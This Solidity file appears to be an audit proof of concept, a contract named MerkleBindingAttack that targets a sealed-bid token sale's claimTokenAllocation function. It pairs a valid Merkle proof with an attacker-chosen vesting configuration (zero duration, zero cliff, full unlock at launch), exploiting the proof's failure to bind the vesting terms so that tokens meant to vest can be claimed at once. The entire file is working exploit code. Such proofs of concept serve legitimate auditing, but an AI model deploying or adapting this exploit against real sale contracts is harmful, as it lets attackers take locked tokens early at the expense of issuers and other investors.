// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { LegionSealedBidAuctionSale } from "https://github.com/ssghost/legion-audit/blob/main/src/sales/LegionSealedBidAuctionSale.sol";
import { ILegionVestingManager } from "https://github.com/ssghost/legion-audit/blob/main/src/interfaces/vesting/ILegionVestingManager.sol";

contract MerkleBindingAttack {
    address public attacker = address(this);
    uint256 public constant ALLOCATION = 1000 * 1e18; 

    function testExploit(address saleAddr, bytes32[] calldata proof) external {
        LegionSealedBidAuctionSale sale = LegionSealedBidAuctionSale(saleAddr);
        
        ILegionVestingManager.LegionInvestorVestingConfig memory maliciousConfig = 
            ILegionVestingManager.LegionInvestorVestingConfig({
                vestingStartTime: uint64(block.timestamp),    
                vestingDurationSeconds: uint64(0),            
                vestingCliffDurationSeconds: uint64(0),       
                vestingType: ILegionVestingManager.VestingType.LEGION_LINEAR, 
                epochDurationSeconds: uint64(0),
                numberOfEpochs: uint64(0),
                tokenAllocationOnTGERate: uint64(10000)        
            });
        
        sale.claimTokenAllocation(ALLOCATION, maliciousConfig, proof);
    }

    function getLeafHash(address _user, uint256 _amount) public pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(_user, _amount))));
    }
}